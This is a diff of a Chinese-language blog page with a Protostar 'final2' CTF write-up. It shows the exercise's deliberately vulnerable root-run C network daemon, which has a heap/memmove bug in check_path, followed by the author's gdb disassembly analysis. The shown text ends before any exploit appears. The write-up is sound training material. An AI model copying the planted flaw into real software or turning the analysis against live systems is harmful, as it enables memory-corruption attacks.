@@ -49,6 +49,11 @@ if (!doNotTrack) {
 
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@callmebill/lxgw-wenkai-web@latest/lxgwwenkaimono-regular/result.css" />
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+
+
 <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
@@ -57,6 +62,8 @@ if (!doNotTrack) {
 <meta name="msapplication-TileColor" content="#000000">
 <meta name="theme-color" content="#ffffff">
 
+        
+    
     </head>
     <body class="
     article-page
@@ -337,83 +344,83 @@ if (!doNotTrack) {
 <p>Core files will be in /tmp.</p>
 <p>This level is at /opt/protostar/bin/final2</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;../common/common.c&#34;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;../common/malloc.c&#34;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="cp">#define NAME &#34;final2&#34;
-</span></span></span><span class="line"><span class="cl"><span class="cp">#define UID 0
-</span></span></span><span class="line"><span class="cl"><span class="cp">#define GID 0
-</span></span></span><span class="line"><span class="cl"><span class="cp">#define PORT 2993
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="cp">#define REQSZ 128
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">check_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">start</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="cm">/*
-</span></span></span><span class="line"><span class="cl"><span class="cm">  * Work out old software bug
-</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">p</span> <span class="o">=</span> <span class="nf">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">l</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="n">start</span> <span class="o">=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;ROOT&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="nf">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>
-</span></span><span class="line"><span class="cl">          <span class="s">&#34;yes&#34;</span> <span class="o">:</span> <span class="s">&#34;no&#34;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">destroylist</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">dll</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="o">!=</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;FSRD&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="nf">check_path</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>     
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;Process OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="s">&#34;Process OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="cm">/* Run the process as a daemon */</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  <span class="cm">/* Wait for socket activity and return */</span>
-</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="nf">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">get_requests</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;../common/common.c&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;../common/malloc.c&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define NAME &#34;final2&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define UID 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define GID 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PORT 2993
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define REQSZ 128
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check_path</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>start;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * Work out old software bug
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> <span style="color:#a6e22e">rindex</span>(buf, <span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>  l <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(p);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(p) {
+</span></span><span style="display:flex;"><span>      start <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(buf, <span style="color:#e6db74">&#34;ROOT&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(start) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span>(<span style="color:#f92672">*</span>start <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;/&#39;</span>) start<span style="color:#f92672">--</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">memmove</span>(start, p, l);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;moving from %p to %p (exploit: %s / %d)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, p, start, start <span style="color:#f92672">&lt;</span> buf <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;yes&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;no&#34;</span>, start <span style="color:#f92672">-</span> buf);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">get_requests</span>(<span style="color:#66d9ef">int</span> fd)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>destroylist[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> dll;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  dll <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(dll <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">255</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(REQSZ, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">read</span>(fd, buf, REQSZ) <span style="color:#f92672">!=</span> REQSZ) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strncmp</span>(buf, <span style="color:#e6db74">&#34;FSRD&#34;</span>, <span style="color:#ae81ff">4</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">check_path</span>(buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      dll<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dll; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">write</span>(fd, <span style="color:#e6db74">&#34;Process OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;Process OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>));
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(destroylist[i]);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> fd;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>username;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Run the process as a daemon */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">background_process</span>(NAME, UID, GID); 
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Wait for socket activity and return */</span>
+</span></span><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">serve_forever</span>(PORT);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_io</span>(fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">get_requests</span>(fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><hr>
 <p>首先很奇怪的&hellip;.在 <code>int get_requests(int fd)</code> 中，出现了 <code>free(destroylist[i]);</code>，但是 <code>destroylist[]</code> 到底存了什么东西，并没有任何地方提到&hellip;.</p>
 <p>因为给的源码和 gdb 二进制文件出来的东西不一样&hellip;</p>
@@ -427,120 +434,120 @@ if (!doNotTrack) {
 <p>rename variable: <code>afvn your_name var_xxxxh</code></p>
 <p>虽然我记了，但我还是用了 gdb x</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel 
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> disassemble get_requests
-</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> get_requests:
-</span></span><span class="line"><span class="cl">0x0804bd47 &lt;get_requests+0&gt;:	push   ebp
-</span></span><span class="line"><span class="cl">0x0804bd48 &lt;get_requests+1&gt;:	mov    ebp,esp
-</span></span><span class="line"><span class="cl">0x0804bd4a &lt;get_requests+3&gt;:	sub    esp,0x428
-</span></span><span class="line"><span class="cl">0x0804bd50 &lt;get_requests+9&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0x0
-</span></span><span class="line"><span class="cl">0x0804bd57 &lt;get_requests+16&gt;:	cmp    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0xfe
-</span></span><span class="line"><span class="cl">0x0804bd5e &lt;get_requests+23&gt;:	jg     0x804bddb &lt;get_requests+148&gt;
-</span></span><span class="line"><span class="cl">0x0804bd60 &lt;get_requests+25&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x1
-</span></span><span class="line"><span class="cl">0x0804bd68 &lt;get_requests+33&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80
-</span></span><span class="line"><span class="cl">0x0804bd6f &lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
-</span></span><span class="line"><span class="cl">0x0804bd74 &lt;get_requests+45&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,eax
-</span></span><span class="line"><span class="cl">0x0804bd77 &lt;get_requests+48&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
-</span></span><span class="line"><span class="cl">0x0804bd7a &lt;get_requests+51&gt;:	mov    edx,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
-</span></span><span class="line"><span class="cl">0x0804bd7d &lt;get_requests+54&gt;:	mov    DWORD PTR <span class="o">[</span>ebp+eax*4-0x414<span class="o">]</span>,edx
-</span></span><span class="line"><span class="cl">......
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set disassembly-flavor intel 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble get_requests
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> get_requests:
+</span></span><span style="display:flex;"><span>0x0804bd47 &lt;get_requests+0&gt;:	push   ebp
+</span></span><span style="display:flex;"><span>0x0804bd48 &lt;get_requests+1&gt;:	mov    ebp,esp
+</span></span><span style="display:flex;"><span>0x0804bd4a &lt;get_requests+3&gt;:	sub    esp,0x428
+</span></span><span style="display:flex;"><span>0x0804bd50 &lt;get_requests+9&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x10<span style="color:#f92672">]</span>,0x0
+</span></span><span style="display:flex;"><span>0x0804bd57 &lt;get_requests+16&gt;:	cmp    DWORD PTR <span style="color:#f92672">[</span>ebp-0x10<span style="color:#f92672">]</span>,0xfe
+</span></span><span style="display:flex;"><span>0x0804bd5e &lt;get_requests+23&gt;:	jg     0x804bddb &lt;get_requests+148&gt;
+</span></span><span style="display:flex;"><span>0x0804bd60 &lt;get_requests+25&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>,0x1
+</span></span><span style="display:flex;"><span>0x0804bd68 &lt;get_requests+33&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x80
+</span></span><span style="display:flex;"><span>0x0804bd6f &lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
+</span></span><span style="display:flex;"><span>0x0804bd74 &lt;get_requests+45&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x14<span style="color:#f92672">]</span>,eax
+</span></span><span style="display:flex;"><span>0x0804bd77 &lt;get_requests+48&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp-0x10<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x0804bd7a &lt;get_requests+51&gt;:	mov    edx,DWORD PTR <span style="color:#f92672">[</span>ebp-0x14<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x0804bd7d &lt;get_requests+54&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp+eax*4-0x414<span style="color:#f92672">]</span>,edx
+</span></span><span style="display:flex;"><span>......
 </span></span></code></pre></div><p>对比一下源码的话可以推断出：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;get_requests+9&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0x0
-</span></span><span class="line"><span class="cl">而源码中出现：dll <span class="o">=</span> <span class="m">0</span> 
-</span></span><span class="line"><span class="cl">所以 ebp-0x10 <span class="o">=</span> dll
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">&lt;get_requests+25&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x1
-</span></span><span class="line"><span class="cl">&lt;get_requests+33&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80	
-</span></span><span class="line"><span class="cl">//--&gt; <span class="nv">0x80</span> <span class="o">=</span> <span class="nv">128</span> <span class="o">=</span> REQSZ
-</span></span><span class="line"><span class="cl">&lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
-</span></span><span class="line"><span class="cl">&lt;get_requests+45&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,eax
-</span></span><span class="line"><span class="cl">调用约定一般把 call 的返回值放到 eax 里，
-</span></span><span class="line"><span class="cl">而源代码中出现：buf <span class="o">=</span> calloc<span class="o">(</span>REQSZ, 1<span class="o">)</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">所以 ebp-0x14 <span class="o">=</span> buf
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">&lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
-</span></span><span class="line"><span class="cl">&lt;get_requests+45&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,eax	
-</span></span><span class="line"><span class="cl">//--&gt; <span class="nv">buf</span> <span class="o">=</span> <span class="nv">eax</span> <span class="o">=</span> &lt;calloc&gt;<span class="err">&#39;</span>s <span class="k">return</span>
-</span></span><span class="line"><span class="cl">&lt;get_requests+48&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>	
-</span></span><span class="line"><span class="cl">//--&gt; <span class="nv">eax</span> <span class="o">=</span> dll
-</span></span><span class="line"><span class="cl">&lt;get_requests+51&gt;:	mov    edx,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>	
-</span></span><span class="line"><span class="cl">//--&gt; <span class="nv">edx</span> <span class="o">=</span> buf
-</span></span><span class="line"><span class="cl">&lt;get_requests+54&gt;:	mov    DWORD PTR <span class="o">[</span>ebp+eax*4-0x414<span class="o">]</span>,edx
-</span></span><span class="line"><span class="cl">//--&gt; <span class="o">[</span>ebp + eax*4 - 0x414<span class="o">]</span> <span class="o">=</span> edx
-</span></span><span class="line"><span class="cl">//--&gt; <span class="o">[</span>ebp - 0x414 + eax*4<span class="o">]</span> <span class="o">=</span> edx
-</span></span><span class="line"><span class="cl">//--&gt; <span class="o">[</span>ebp - 0x414 + dll*4<span class="o">]</span> <span class="o">=</span> buf
-</span></span><span class="line"><span class="cl">ebp - 0x414 看起来像是某个起始值...再加上 dll*4 <span class="o">(</span>int 数组一个值 4bytes<span class="o">)</span>
-</span></span><span class="line"><span class="cl">所以大概可以推断出源码是这样：
-</span></span><span class="line"><span class="cl">destroylist<span class="o">[</span>dll<span class="o">]</span> <span class="o">=</span> buf<span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">即：
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">dll</span> <span class="o">=</span> 0<span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="o">(</span>1<span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="o">(</span>dll &gt;<span class="o">=</span> 255<span class="o">)</span> break<span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="nv">buf</span> <span class="o">=</span> calloc<span class="o">(</span>REQSZ, 1<span class="o">)</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      destroylist<span class="o">[</span>dll<span class="o">]</span> <span class="o">=</span> buf<span class="p">;</span> //&lt;--就是这玩意，题目给的源码里根本没写
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="o">(</span>read<span class="o">(</span>fd, buf, REQSZ<span class="o">)</span> !<span class="o">=</span> REQSZ<span class="o">)</span> break<span class="p">;</span>
-</span></span><span class="line"><span class="cl">      .......
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;get_requests+9&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x10<span style="color:#f92672">]</span>,0x0
+</span></span><span style="display:flex;"><span>而源码中出现：dll <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> 
+</span></span><span style="display:flex;"><span>所以 ebp-0x10 <span style="color:#f92672">=</span> dll
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;get_requests+25&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>,0x1
+</span></span><span style="display:flex;"><span>&lt;get_requests+33&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x80	
+</span></span><span style="display:flex;"><span>//--&gt; 0x80 <span style="color:#f92672">=</span> 128 <span style="color:#f92672">=</span> REQSZ
+</span></span><span style="display:flex;"><span>&lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
+</span></span><span style="display:flex;"><span>&lt;get_requests+45&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x14<span style="color:#f92672">]</span>,eax
+</span></span><span style="display:flex;"><span>调用约定一般把 call 的返回值放到 eax 里，
+</span></span><span style="display:flex;"><span>而源代码中出现：buf <span style="color:#f92672">=</span> calloc<span style="color:#f92672">(</span>REQSZ, 1<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>所以 ebp-0x14 <span style="color:#f92672">=</span> buf
+</span></span><span style="display:flex;"><span>
